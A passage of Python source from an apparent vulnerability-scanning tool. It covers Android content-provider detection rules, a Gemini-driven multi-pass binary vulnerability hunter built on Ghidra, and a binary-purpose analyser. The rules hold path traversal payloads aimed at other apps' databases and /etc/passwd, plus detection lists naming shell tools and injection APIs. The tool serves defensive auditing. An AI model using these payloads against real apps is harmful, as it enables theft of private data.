            "remediation": "Use parameterized queries. Pass user input via selectionArgs parameter only."
        },
        # Path traversal in openFile
        {
            "pattern": r'public\s+ParcelFileDescriptor\s+openFile[^{]+\{[^}]*new\s+File\s*\([^)]*uri|getLastPathSegment\s*\(\s*\)',
            "title": "Content Provider Path Traversal",
            "severity": "high",
            "category": "Path Traversal",
            "cwe": "CWE-22",
            "description": "File path from URI used in openFile() - potential path traversal",
            "exploitation": """1. content://provider/files/..%2F..%2F..%2Fdata%2Fdata%2Fother.app%2Fdatabases%2Fsecrets.db
2. content://provider/read?file=../../../etc/passwd
3. Access files outside content provider's intended directory""",
            "remediation": "Validate path against base directory using getCanonicalPath(). Reject paths containing '..' or starting with '/'"
        },
        # Granting URI permissions
        {
            "pattern": r'FLAG_GRANT_READ_URI_PERMISSION|FLAG_GRANT_WRITE_URI_PERMISSION|grantUriPermission',
            "title": "URI Permission Grant",
            "severity": "medium",
            "category": "Permission Bypass",
            "cwe": "CWE-732",
            "description": "URI permissions granted to other apps - verify this is intentional",
            "exploitation": "If misused, can grant access to private data to malicious apps",
            "remediation": "Only grant URI permissions when necessary. Revoke with revokeUriPermission() after use."
        },
        # Cursor data exposure
        {
            "pattern": r'MatrixCursor|return\s+cursor|\.query\s*\([^)]+\)\s*;',
            "title": "Content Provider Data Query",
            "severity": "low",
            "category": "Data Exposure",
            "cwe": "CWE-200",
            "description": "Content Provider returns cursor data - verify sensitive columns are protected",
            "exploitation": "Query content provider to enumerate available data: adb shell content query --uri content://provider",
            "remediation": "Filter sensitive columns from projection. Implement row-level security based on calling package."
        },
        # insert without validation
        {
            "pattern": r'public\s+Uri\s+insert[^{]+\{[^}]*\.insert\s*\([^,]+,\s*values\s*\)',
            "title": "Content Provider Insert Without Validation",
            "severity": "medium",
            "category": "Data Injection",
            "cwe": "CWE-20",
            "description": "Content Provider insert() may not validate input ContentValues",
            "exploitation": """1. Insert malicious data that's displayed elsewhere (stored XSS)
2. Overflow database columns
3. Inject data that bypasses business logic""",
            "remediation": "Validate all ContentValues fields. Whitelist allowed columns. Sanitize string values."
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Quick check for content provider code
            if not any(x in content for x in ['ContentProvider', 'ContentResolver', 'MatrixCursor',
                                               'public Cursor query', 'ParcelFileDescriptor',
                                               'grantUriPermission', 'content://']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content, re.MULTILINE | re.DOTALL):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "content_provider_security",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "medium",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path} for content provider patterns: {e}")
    
    return findings


# ============================================================================
# AI VULNERABILITY HUNTER
# ============================================================================
# Multi-pass autonomous vulnerability detection with AI-guided analysis

@dataclass
class VulnerabilityHuntTarget:
    """A target identified for deep vulnerability analysis."""
    function_name: str
    entry_address: str
    reason: str
    category: str  # buffer_overflow, format_string, use_after_free, etc.
    priority: int  # 1-10, higher = more interesting
    decompiled_code: str = ""


@dataclass
class VulnerabilityFinding:
    """A confirmed or suspected vulnerability from the hunt."""
    id: str
    title: str
    severity: str  # critical, high, medium, low
    category: str
    cwe_id: Optional[str]
    cvss_estimate: float
    function_name: str
    entry_address: str
    description: str
    technical_details: str
    proof_of_concept: str
    exploitation_steps: List[str]
    remediation: str
    confidence: float  # 0.0-1.0
    ai_reasoning: str
    code_snippet: str


@dataclass
class VulnerabilityHuntResult:
    """Complete result of an AI vulnerability hunt."""
    scan_id: str
    filename: str
    passes_completed: int
    total_functions_analyzed: int
    targets_identified: int
    vulnerabilities: List[VulnerabilityFinding]
    attack_surface_summary: Dict[str, Any]
    hunting_log: List[Dict[str, Any]]
    executive_summary: str
    risk_score: int  # 0-100
    recommended_focus_areas: List[str]


# Vulnerability categories for the hunt
VULN_HUNT_CATEGORIES = {
    "buffer_overflow": {
        "dangerous_functions": [
            "strcpy", "strcat", "sprintf", "vsprintf", "gets", "scanf",
            "memcpy", "memmove", "strncpy", "strncat", "snprintf",
            "wcscpy", "wcscat", "swprintf", "lstrcpy", "lstrcpyA", "lstrcpyW",
            "_mbscpy", "CopyMemory", "RtlCopyMemory",
        ],
        "patterns": [
            r"char\s+\w+\s*\[\s*\d+\s*\]",  # Fixed-size char buffers
            r"alloca\s*\(",  # Stack allocation
            r"VirtualAlloc|HeapAlloc|malloc|realloc",  # Heap operations
        ],
        "cwe": "CWE-120",
        "description": "Memory corruption via buffer overflow",
    },
    "format_string": {
        "dangerous_functions": [
            "printf", "fprintf", "sprintf", "snprintf", "vprintf",
            "vfprintf", "vsprintf", "vsnprintf", "syslog", "wprintf",
            "fwprintf", "swprintf", "NSLog", "OutputDebugString",
        ],
        "patterns": [
            r'printf\s*\(\s*[^"]+\)',  # printf without format string literal
            r'%n',  # Write format specifier
        ],
        "cwe": "CWE-134",
        "description": "Format string vulnerability allowing memory read/write",
    },
    "integer_overflow": {
        "dangerous_functions": [
            "malloc", "realloc", "calloc", "VirtualAlloc",
            "HeapAlloc", "LocalAlloc", "GlobalAlloc",
        ],
        "patterns": [
            r"\*\s*sizeof\s*\(",  # Size calculation
            r"\+\s*\d+\s*\*",  # Arithmetic before allocation
            r"<<\s*\d+",  # Bit shift
        ],
        "cwe": "CWE-190",
        "description": "Integer overflow leading to incorrect size calculations",
    },
    "use_after_free": {
        "dangerous_functions": [
            "free", "delete", "HeapFree", "LocalFree", "GlobalFree",
            "VirtualFree", "CoTaskMemFree", "SysFreeString",
        ],
        "patterns": [
            r"free\s*\([^)]+\)\s*;[^=]*\w+\s*->",  # Use after free
            r"delete\s+\w+\s*;[^=]*\w+\s*->",
        ],
        "cwe": "CWE-416",
        "description": "Dangling pointer access after memory deallocation",
    },
    "command_injection": {
        "dangerous_functions": [
            "system", "popen", "exec", "execl", "execle", "execlp",
            "execv", "execve", "execvp", "ShellExecute", "ShellExecuteEx",
            "CreateProcess", "WinExec", "_wsystem", "_popen",
        ],
        "patterns": [
            r'system\s*\([^"]+\)',  # system with variable
            r'popen\s*\([^"]+\)',
            r'exec[lv]?[pe]?\s*\(',
        ],
        "cwe": "CWE-78",
        "description": "OS command injection via unsanitized input",
    },
    "path_traversal": {
        "dangerous_functions": [
            "fopen", "open", "CreateFile", "CreateFileA", "CreateFileW",
            "DeleteFile", "RemoveDirectory", "MoveFile", "CopyFile",
        ],
        "patterns": [
            r'\.\.',  # Directory traversal sequence
            r'fopen\s*\([^"]+,',  # fopen with variable path
        ],
        "cwe": "CWE-22",
        "description": "Path traversal allowing arbitrary file access",
    },
    "race_condition": {
        "dangerous_functions": [
            "access", "stat", "lstat", "chmod", "chown", "unlink",
            "rename", "mkdir", "rmdir", "open", "creat",
        ],
        "patterns": [
            r'access\s*\([^)]+\)\s*.*\s*open\s*\(',  # TOCTOU
            r'stat\s*\([^)]+\)\s*.*\s*open\s*\(',
        ],
        "cwe": "CWE-362",
        "description": "Time-of-check to time-of-use race condition",
    },
    "crypto_weakness": {
        "dangerous_functions": [
            "DES_", "RC4", "MD5", "SHA1", "rand", "srand",
            "CryptGenRandom", "BCryptGenRandom",
        ],
        "patterns": [
            r'DES|RC4|MD5\s*\(',
            r'rand\s*\(\s*\)',
            r'key\s*=\s*["\'][^"\']+["\']',  # Hardcoded key
        ],
        "cwe": "CWE-327",
        "description": "Use of broken or risky cryptographic algorithm",
    },
}


async def ai_vulnerability_hunt(
    file_path: Path,
    focus_categories: Optional[List[str]] = None,
    max_passes: int = 3,
    max_targets_per_pass: int = 20,
    ghidra_max_functions: int = 500,
    ghidra_decomp_limit: int = 8000,
    on_progress: callable = None,
) -> VulnerabilityHuntResult:
    """
    Perform autonomous multi-pass AI-guided vulnerability hunting.
    
    Pass 1: Broad static analysis to identify attack surface
    Pass 2: AI identifies high-priority targets from decompiled code
    Pass 3+: Deep analysis of specific functions for vulnerabilities
    
    Args:
        file_path: Path to the binary file
        focus_categories: Optional list of vulnerability categories to focus on
        max_passes: Maximum number of analysis passes
        max_targets_per_pass: Max functions to deeply analyze per pass
        on_progress: Callback for progress updates
    
    Returns:
        VulnerabilityHuntResult with all findings
    """
    if not settings.gemini_api_key:
        raise ValueError("Gemini API key required for AI vulnerability hunting")
    
    scan_id = str(uuid.uuid4())
    hunting_log = []
    targets: List[VulnerabilityHuntTarget] = []
    vulnerabilities: List[VulnerabilityFinding] = []
    
    categories = focus_categories or list(VULN_HUNT_CATEGORIES.keys())
    
    def log_event(event_type: str, message: str, details: Dict = None):
        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "type": event_type,
            "message": message,
            "details": details or {},
        }
        hunting_log.append(entry)
        logger.info(f"[VulnHunt] {event_type}: {message}")
    
    async def report_progress(phase: str, progress: int, message: str):
        if on_progress:
            await on_progress(phase, progress, message)
    
    try:
        # ====================================================================
        # PASS 1: Initial reconnaissance and Ghidra decompilation
        # ====================================================================
        log_event("pass_start", "Starting Pass 1: Initial Reconnaissance")
        await report_progress("pass1", 0, "Starting Ghidra decompilation...")
        
        # Run Ghidra analysis with extended limits
        ghidra_result = analyze_binary_with_ghidra(
            file_path,
            max_functions=ghidra_max_functions,
            decomp_limit=ghidra_decomp_limit,
        )
        
        if not ghidra_result or "error" in ghidra_result:
            error_msg = ghidra_result.get("error", "Unknown error") if ghidra_result else "Ghidra failed"
            log_event("error", f"Ghidra analysis failed: {error_msg}")
            raise ValueError(f"Ghidra analysis required but failed: {error_msg}")
        
        functions = ghidra_result.get("functions", [])
        total_functions = ghidra_result.get("functions_total", len(functions))
        
        log_event("ghidra_complete", f"Ghidra decompiled {len(functions)} of {total_functions} functions")
        await report_progress("pass1", 30, f"Analyzing {len(functions)} decompiled functions...")
        
        # Build function index and identify dangerous calls
        function_index = {}
        dangerous_function_usage = {}
        
        for func in functions:
            name = func.get("name", "unknown")
            entry = func.get("entry", "0x0")
            code = func.get("decompiled", "")
            called = func.get("called_functions", [])
            
            function_index[name] = {
                "entry": entry,
                "size": func.get("size", 0),
                "code": code,
                "called": called,
            }
            
            # Check for dangerous function calls
            for category, cat_info in VULN_HUNT_CATEGORIES.items():
                if category not in categories:
                    continue
                    
                for dangerous_fn in cat_info["dangerous_functions"]:
                    if dangerous_fn in called or dangerous_fn.lower() in code.lower():
                        if name not in dangerous_function_usage:
                            dangerous_function_usage[name] = []
                        dangerous_function_usage[name].append({
                            "dangerous_function": dangerous_fn,
                            "category": category,
                            "cwe": cat_info["cwe"],
                        })
        
        await report_progress("pass1", 60, f"Found {len(dangerous_function_usage)} functions with dangerous calls")
        
        # ====================================================================
        # PASS 2: AI triage to identify high-priority targets
        # ====================================================================
        log_event("pass_start", "Starting Pass 2: AI Triage")
        await report_progress("pass2", 0, "AI analyzing attack surface...")
        
        # Prepare summary for AI triage
        dangerous_summary = []
        for func_name, usages in list(dangerous_function_usage.items())[:100]:
            func_info = function_index.get(func_name, {})
            categories_used = list(set(u["category"] for u in usages))
            dangerous_summary.append({
                "function": func_name,
                "entry": func_info.get("entry", "unknown"),
                "size": func_info.get("size", 0),
                "categories": categories_used,
                "dangerous_calls": [u["dangerous_function"] for u in usages],
            })
        
        # AI triage prompt
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        triage_prompt = f"""You are an expert vulnerability researcher performing automated triage.

Analyze these functions from a binary and identify the TOP {max_targets_per_pass} most likely to contain exploitable vulnerabilities.

## Functions with Dangerous Calls
{json.dumps(dangerous_summary[:50], indent=2)}

## Total Functions Available: {len(functions)}
## Dangerous Call Functions: {len(dangerous_function_usage)}

## Vulnerability Categories of Interest
{json.dumps({k: v["description"] for k, v in VULN_HUNT_CATEGORIES.items() if k in categories}, indent=2)}

## Task
Return a JSON array of the {max_targets_per_pass} highest-priority targets for deep analysis.

Each target should have:
- function_name: Name of the function
- category: Primary vulnerability category (buffer_overflow, format_string, etc.)
- priority: 1-10 (10 = most likely vulnerable)
- reason: Brief explanation of why this function is interesting

Focus on:
1. Functions that combine multiple dangerous operations
2. Functions handling external input (network, file, user input)
3. Large functions with complex logic
4. Functions with string manipulation and memory operations

Return ONLY the JSON array, no other text."""

        await report_progress("pass2", 30, "Waiting for AI triage response...")
        
        triage_response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=triage_prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Vulnerability Hunt Triage"
        )
        
        if not triage_response:
            log_event("error", "AI triage failed")
            raise ValueError("AI triage failed - no response")
        
        # Parse AI targets
        try:
            triage_text = triage_response.text.strip()
            # Extract JSON from response
            if "```json" in triage_text:
                triage_text = triage_text.split("```json")[1].split("```")[0]
            elif "```" in triage_text:
                triage_text = triage_text.split("```")[1].split("```")[0]
            
            ai_targets = json.loads(triage_text)
            
            for t in ai_targets:
                func_name = t.get("function_name", "")
                if func_name in function_index:
                    targets.append(VulnerabilityHuntTarget(
                        function_name=func_name,
                        entry_address=function_index[func_name]["entry"],
                        reason=t.get("reason", ""),
                        category=t.get("category", "unknown"),
                        priority=t.get("priority", 5),
                        decompiled_code=function_index[func_name]["code"],
                    ))
        except json.JSONDecodeError as e:
            log_event("warning", f"Failed to parse AI triage response: {e}")
            # Fallback to top dangerous functions
            for func_name, usages in list(dangerous_function_usage.items())[:max_targets_per_pass]:
                func_info = function_index.get(func_name, {})
                targets.append(VulnerabilityHuntTarget(
                    function_name=func_name,
                    entry_address=func_info.get("entry", "0x0"),
                    reason="Contains dangerous function calls",
                    category=usages[0]["category"] if usages else "unknown",
                    priority=len(usages) + 5,
                    decompiled_code=func_info.get("code", ""),
                ))
        
        log_event("triage_complete", f"Identified {len(targets)} high-priority targets")
        await report_progress("pass2", 100, f"Identified {len(targets)} targets for deep analysis")
        
        # ====================================================================
        # PASS 3+: Deep vulnerability analysis
        # ====================================================================
        for pass_num in range(3, max_passes + 1):
            log_event("pass_start", f"Starting Pass {pass_num}: Deep Vulnerability Analysis")
            await report_progress(f"pass{pass_num}", 0, f"Deep analyzing {len(targets)} functions...")
            
            sem = asyncio.Semaphore(3)  # Limit concurrent AI calls
            
            async def analyze_target(target: VulnerabilityHuntTarget, idx: int) -> Optional[VulnerabilityFinding]:
                """Deep analyze a single target function for vulnerabilities."""
                analysis_prompt = f"""You are an expert binary vulnerability researcher. Analyze this decompiled function for security vulnerabilities.

## Function Information
- **Name:** {target.function_name}
- **Entry Address:** {target.entry_address}
- **Suspected Category:** {target.category}
- **Selection Reason:** {target.reason}

## Decompiled Code
```c
{target.decompiled_code[:12000]}
```

## Analysis Instructions
Perform a thorough security audit of this function. Look for:

1. **Buffer Overflows**: strcpy, sprintf without bounds, memcpy with unchecked sizes
2. **Format String Bugs**: printf/sprintf with user-controlled format string
3. **Integer Overflows**: Size calculations that could wrap
4. **Use-After-Free**: Dangling pointer access after free
5. **Command Injection**: system(), popen() with unsanitized input
6. **Path Traversal**: File operations with unchecked paths
7. **Race Conditions**: TOCTOU vulnerabilities
8. **Crypto Issues**: Weak algorithms, hardcoded keys

## Response Format
If you find a vulnerability, respond with this JSON structure:
```json
{{
    "found": true,
    "title": "Short descriptive title",
    "severity": "critical|high|medium|low",
    "category": "{target.category}",
    "cwe_id": "CWE-XXX",
    "cvss_estimate": 7.5,
    "description": "Clear description of the vulnerability",
    "technical_details": "Technical explanation with code references",
    "proof_of_concept": "Pseudo-code or steps to trigger the bug",
    "exploitation_steps": ["Step 1", "Step 2", "Step 3"],
    "remediation": "How to fix the vulnerability",
    "confidence": 0.85,
    "reasoning": "Why you believe this is exploitable"
}}
```

If no vulnerability is found:
```json
{{
    "found": false,
    "notes": "Brief explanation of why this function appears safe"
}}
```

Be thorough but accurate. Only report actual vulnerabilities, not theoretical ones.
Return ONLY the JSON, no other text."""

                async with sem:
                    response = await gemini_request_with_retry(
                        lambda: client.aio.models.generate_content(
                            model=settings.gemini_model_id,
                            contents=[types.Content(role="user", parts=[types.Part(text=analysis_prompt)])],
                        ),
                        max_retries=3,
                        base_delay=2.0,
                        timeout_seconds=180.0,
                        operation_name=f"Deep analysis of {target.function_name}"
                    )
                    
                    if not response:
                        return None
                    
                    try:
                        result_text = response.text.strip()
                        if "```json" in result_text:
                            result_text = result_text.split("```json")[1].split("```")[0]
                        elif "```" in result_text:
                            result_text = result_text.split("```")[1].split("```")[0]
                        
                        result = json.loads(result_text)
                        
                        if result.get("found"):
                            return VulnerabilityFinding(
                                id=str(uuid.uuid4()),
                                title=result.get("title", "Unnamed vulnerability"),
                                severity=result.get("severity", "medium"),
                                category=result.get("category", target.category),
                                cwe_id=result.get("cwe_id"),
                                cvss_estimate=result.get("cvss_estimate", 5.0),
                                function_name=target.function_name,
                                entry_address=target.entry_address,
                                description=result.get("description", ""),
                                technical_details=result.get("technical_details", ""),
                                proof_of_concept=result.get("proof_of_concept", ""),
                                exploitation_steps=result.get("exploitation_steps", []),
                                remediation=result.get("remediation", ""),
                                confidence=result.get("confidence", 0.5),
                                ai_reasoning=result.get("reasoning", ""),
                                code_snippet=target.decompiled_code[:2000],
                            )
                    except json.JSONDecodeError:
                        log_event("warning", f"Failed to parse analysis for {target.function_name}")
                    
                    return None
            
            # Analyze all targets
            tasks = [analyze_target(t, i) for i, t in enumerate(targets)]
            results = await asyncio.gather(*tasks)
            
            for finding in results:
                if finding:
                    vulnerabilities.append(finding)
                    log_event("vulnerability_found", f"Found: {finding.title} in {finding.function_name}", {
                        "severity": finding.severity,
                        "category": finding.category,
                        "confidence": finding.confidence,
                    })
            
            await report_progress(f"pass{pass_num}", 100, f"Found {len(vulnerabilities)} vulnerabilities so far")
            
            # Clear targets for next pass (would identify new ones from context)
            targets = []
        
        # ====================================================================
        # Generate final summary
        # ====================================================================
        log_event("summary", "Generating executive summary")
        await report_progress("summary", 0, "Generating executive summary...")
        
        # Build attack surface summary
        attack_surface = {
            "total_functions": total_functions,
            "functions_with_dangerous_calls": len(dangerous_function_usage),
            "categories_detected": list(set(
                cat for usages in dangerous_function_usage.values() for cat in [u["category"] for u in usages]
            )),
            "dangerous_function_counts": {},
        }
        
        for usages in dangerous_function_usage.values():
            for u in usages:
                fn = u["dangerous_function"]
                attack_surface["dangerous_function_counts"][fn] = \
                    attack_surface["dangerous_function_counts"].get(fn, 0) + 1
        
        # Calculate risk score
        risk_score = 0
        severity_weights = {"critical": 40, "high": 25, "medium": 10, "low": 5}
        for v in vulnerabilities:
            risk_score += severity_weights.get(v.severity, 5) * v.confidence
        risk_score = min(100, int(risk_score))
        
        # Generate executive summary
        exec_summary_prompt = f"""Generate a concise executive summary for this vulnerability hunt.

## Results
- Filename: {file_path.name}
- Total Functions: {total_functions}
- Functions with Dangerous Calls: {len(dangerous_function_usage)}
- Vulnerabilities Found: {len(vulnerabilities)}
- Risk Score: {risk_score}/100

## Vulnerabilities Discovered
{json.dumps([{
    "title": v.title,
    "severity": v.severity,
    "category": v.category,
    "function": v.function_name,
    "confidence": v.confidence,
} for v in vulnerabilities], indent=2)}

Write a 3-4 sentence executive summary suitable for a security report. Focus on the key risks and overall security posture. Do not use markdown formatting."""

        summary_response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=exec_summary_prompt)])],
            ),
            max_retries=2,
            base_delay=1.0,
            timeout_seconds=60.0,
            operation_name="Executive summary generation"
        )
        
        exec_summary = summary_response.text if summary_response else \
            f"Analysis identified {len(vulnerabilities)} potential vulnerabilities across {len(dangerous_function_usage)} high-risk functions."
        
        # Recommended focus areas
        focus_areas = []
        category_counts = {}
        for v in vulnerabilities:
            category_counts[v.category] = category_counts.get(v.category, 0) + 1
        
        for cat, count in sorted(category_counts.items(), key=lambda x: -x[1])[:5]:
            cat_info = VULN_HUNT_CATEGORIES.get(cat, {})
            focus_areas.append(f"{cat.replace('_', ' ').title()}: {count} findings - {cat_info.get('description', '')}")
        
        if not focus_areas:
            focus_areas = ["No critical vulnerabilities identified - continue monitoring"]
        
        await report_progress("complete", 100, "Vulnerability hunt complete")
        
        return VulnerabilityHuntResult(
            scan_id=scan_id,
            filename=file_path.name,
            passes_completed=max_passes,
            total_functions_analyzed=len(functions),
            targets_identified=len(dangerous_function_usage),
            vulnerabilities=vulnerabilities,
            attack_surface_summary=attack_surface,
            hunting_log=hunting_log,
            executive_summary=exec_summary,
            risk_score=risk_score,
            recommended_focus_areas=focus_areas,
        )
        
    except Exception as e:
        log_event("error", f"Vulnerability hunt failed: {str(e)}")
        logger.exception(f"Vulnerability hunt failed: {e}")
        raise


# Helper to serialize VulnerabilityHuntResult
def vulnerability_hunt_result_to_dict(result: VulnerabilityHuntResult) -> Dict[str, Any]:
    """Convert VulnerabilityHuntResult to JSON-serializable dict."""
    return {
        "scan_id": result.scan_id,
        "filename": result.filename,
        "passes_completed": result.passes_completed,
        "total_functions_analyzed": result.total_functions_analyzed,
        "targets_identified": result.targets_identified,
        "vulnerabilities": [
            {
                "id": v.id,
                "title": v.title,
                "severity": v.severity,
                "category": v.category,
                "cwe_id": v.cwe_id,
                "cvss_estimate": v.cvss_estimate,
                "function_name": v.function_name,
                "entry_address": v.entry_address,
                "description": v.description,
                "technical_details": v.technical_details,
                "proof_of_concept": v.proof_of_concept,
                "exploitation_steps": v.exploitation_steps,
                "remediation": v.remediation,
                "confidence": v.confidence,
                "ai_reasoning": v.ai_reasoning,
                "code_snippet": v.code_snippet,
            }
            for v in result.vulnerabilities
        ],
        "attack_surface_summary": result.attack_surface_summary,
        "hunting_log": result.hunting_log,
        "executive_summary": result.executive_summary,
        "risk_score": result.risk_score,
        "recommended_focus_areas": result.recommended_focus_areas,
    }


# ============================================================================
# Binary Purpose Analysis ("What does this Binary do?")
# ============================================================================

@dataclass
class BinaryPurposeAnalysis:
    """Result of analyzing what a binary does."""
    filename: str
    purpose_summary: str  # 1-2 sentence summary
    detailed_description: str  # Multi-paragraph explanation
    category: str  # e.g., "utility", "malware", "game", "server", "library"
    functionality: List[str]  # List of main functionalities
    capabilities: Dict[str, List[str]]  # Categorized capabilities
    api_usage: Dict[str, List[str]]  # APIs used grouped by category
    suspicious_behaviors: List[Dict[str, Any]]  # Potentially malicious indicators
    data_handling: Dict[str, Any]  # What data it reads/writes
    network_activity: Dict[str, Any]  # Network-related functionality
    file_operations: Dict[str, Any]  # File system operations
    process_operations: Dict[str, Any]  # Process/thread operations
    crypto_usage: Dict[str, Any]  # Cryptographic operations
    ui_type: str  # "console", "gui", "service", "library", "unknown"
    confidence: float  # 0.0-1.0 confidence in analysis
    analysis_notes: List[str]  # Additional observations


async def analyze_binary_purpose(
    file_path: Path,
    use_ghidra: bool = True,
    progress_callback: Optional[Any] = None,
) -> BinaryPurposeAnalysis:
    """
    Analyze a binary to determine what it does and its purpose.
    
    Uses a combination of:
    1. Import/export analysis to identify API usage
    2. String analysis to find indicators
    3. Section analysis for structure understanding
    4. Ghidra decompilation for code flow analysis
    5. AI synthesis for comprehensive understanding
    
    Args:
        file_path: Path to the binary file
        use_ghidra: Whether to use Ghidra for decompilation
        progress_callback: Optional callback for progress updates
        
    Returns:
        BinaryPurposeAnalysis with comprehensive binary analysis
    """
    from google import genai
    from google.genai import types
    
    # Initialize Gemini client
    client = genai.Client(api_key=settings.gemini_api_key)
    
    async def report_progress(phase: str, pct: int, msg: str):
        if progress_callback:
            await progress_callback(phase, pct, msg)
    
    await report_progress("init", 0, "Starting binary purpose analysis...")
    
    # Step 1: Basic binary analysis
    await report_progress("metadata", 10, "Analyzing binary metadata...")
    
    metadata = analyze_binary(file_path)
    if "error" in metadata:
        raise ValueError(f"Failed to analyze binary: {metadata['error']}")
    
    # Step 2: Extract detailed information
    await report_progress("imports", 20, "Analyzing imports and exports...")
    
    imports = metadata.get("imports", [])
    exports = metadata.get("exports", [])
    strings_data = metadata.get("strings", [])
    sections = metadata.get("sections", [])
    
    # Categorize imports by functionality
    api_categories = {
        "file_system": ["CreateFile", "ReadFile", "WriteFile", "DeleteFile", "FindFirstFile", 
                       "fopen", "fread", "fwrite", "open", "read", "write", "unlink", "stat"],
        "network": ["socket", "connect", "send", "recv", "WSAStartup", "HttpOpenRequest",
                   "InternetOpen", "URLDownloadToFile", "gethostbyname", "getaddrinfo"],
        "process": ["CreateProcess", "ShellExecute", "system", "popen", "fork", "exec", 
                   "VirtualAlloc", "VirtualProtect", "WriteProcessMemory", "CreateThread"],
        "registry": ["RegOpenKey", "RegSetValue", "RegQueryValue", "RegCreateKey", "RegDeleteKey"],
        "crypto": ["CryptAcquireContext", "CryptEncrypt", "CryptDecrypt", "MD5", "SHA1", "SHA256",
                  "AES", "RSA", "BCryptOpenAlgorithmProvider", "EVP_", "RAND_bytes"],
        "memory": ["malloc", "free", "realloc", "HeapAlloc", "HeapFree", "mmap", "VirtualAlloc"],
        "string": ["strcpy", "strcat", "sprintf", "printf", "strlen", "memcpy", "memset"],
        "gui": ["CreateWindow", "ShowWindow", "MessageBox", "GetMessage", "DispatchMessage",
               "gtk_", "QApplication", "SDL_", "glfw"],
        "debug": ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "OutputDebugString", "ptrace"],
        "time": ["GetTickCount", "QueryPerformanceCounter", "time", "gettimeofday", "Sleep"],
        "service": ["StartServiceCtrlDispatcher", "RegisterServiceCtrlHandler", "SetServiceStatus"],
    }
    
    categorized_apis: Dict[str, List[str]] = {cat: [] for cat in api_categories}
    
    for imp in imports:
        imp_name = imp.get("name", "") if isinstance(imp, dict) else str(imp)
        for category, apis in api_categories.items():
            if any(api.lower() in imp_name.lower() for api in apis):
                categorized_apis[category].append(imp_name)
    
    # Remove empty categories
    categorized_apis = {k: v for k, v in categorized_apis.items() if v}
    
    # Step 3: Decompile with Ghidra for code understanding
    decompiled_code = ""
    function_summaries = []
    
    if use_ghidra:
        await report_progress("ghidra", 40, "Decompiling with Ghidra...")
        
        try:
            ghidra_result = await analyze_binary_with_ghidra(
                file_path,
                max_functions=50,  # Limit for purpose analysis
                decompilation_limit=3000,
            )
            
            if ghidra_result.get("success"):
                functions = ghidra_result.get("functions", [])
                
                # Get interesting function summaries
                for func in functions[:30]:
                    if func.get("decompiled_code"):
                        code = func["decompiled_code"][:1500]
                        function_summaries.append({
                            "name": func.get("name", "unknown"),
                            "entry": func.get("entry_point", ""),
                            "code_preview": code,
                        })
                        decompiled_code += f"\n\n// Function: {func.get('name', 'unknown')}\n{code}"
        except Exception as e:
            logger.warning(f"Ghidra decompilation failed: {e}")
    
    # Step 4: Analyze strings for purpose indicators
    await report_progress("strings", 60, "Analyzing strings and indicators...")
    
    interesting_strings = []
    url_patterns = []
    file_paths = []
    commands = []
    messages = []
    
    for s in strings_data[:500]:
        value = s.get("value", "") if isinstance(s, dict) else str(s)
        if len(value) < 4:
            continue
            
        # URLs
        if any(proto in value.lower() for proto in ["http://", "https://", "ftp://", "ws://"]):
            url_patterns.append(value)
        # File paths
        elif any(pattern in value for pattern in ["C:\\", "/usr/", "/etc/", "/tmp/", ".exe", ".dll", ".so"]):
            file_paths.append(value)
        # Commands
        elif any(cmd in value.lower() for cmd in ["cmd.exe", "/bin/sh", "powershell", "bash"]):
            commands.append(value)
        # User-facing messages
        elif len(value) > 20 and value[0].isupper() and " " in value:
            messages.append(value)
        # Interesting keywords
        elif any(kw in value.lower() for kw in ["password", "key", "secret", "token", "license", "error", "success"]):
            interesting_strings.append(value)
    
    # Step 5: AI-powered purpose analysis
    await report_progress("ai", 75, "AI analyzing binary purpose...")
    
    # Build analysis context
    analysis_context = f"""Analyze this binary and determine its purpose.

## Binary Information
- Filename: {file_path.name}
- File Type: {metadata.get("file_type", "unknown")}
- Architecture: {metadata.get("architecture", "unknown")}
- Size: {metadata.get("file_size", 0)} bytes
- Entry Point: {hex(metadata.get("entry_point", 0)) if metadata.get("entry_point") else "N/A"}
- Is Packed: {metadata.get("is_packed", False)}
- Compile Time: {metadata.get("compile_time", "unknown")}

## Sections
{json.dumps(sections[:10], indent=2)}

## API Categories Used
{json.dumps(categorized_apis, indent=2)}

## Import Count by Library
{json.dumps({lib: len([i for i in imports if isinstance(i, dict) and i.get("library") == lib]) for lib in set(i.get("library", "") for i in imports if isinstance(i, dict))}[:20], indent=2) if imports else "No imports"}

## Interesting Strings (sample)
URLs: {url_patterns[:10]}
File Paths: {file_paths[:10]}
Commands: {commands[:5]}
User Messages: {messages[:10]}
Keywords: {interesting_strings[:20]}

## Decompiled Code Sample
{decompiled_code[:8000]}

Based on this analysis, provide a comprehensive assessment of what this binary does.

Return JSON with this exact structure:
{{
    "purpose_summary": "One sentence summary of what this binary does",
    "detailed_description": "2-3 paragraphs explaining the binary's purpose, functionality, and behavior",
    "category": "utility|malware|game|server|library|installer|tool|driver|unknown",
    "functionality": ["List of main functionalities this binary provides"],
    "suspicious_behaviors": [
        {{"behavior": "description", "severity": "low|medium|high|critical", "indicator": "what suggests this"}}
    ],
    "data_handling": {{
        "reads": ["Types of data it reads"],
        "writes": ["Types of data it writes"],
        "stores": ["Where/how it stores data"]
    }},
    "network_activity": {{
        "has_network": true/false,
        "protocols": ["List of protocols used"],
        "purposes": ["What network is used for"]
    }},
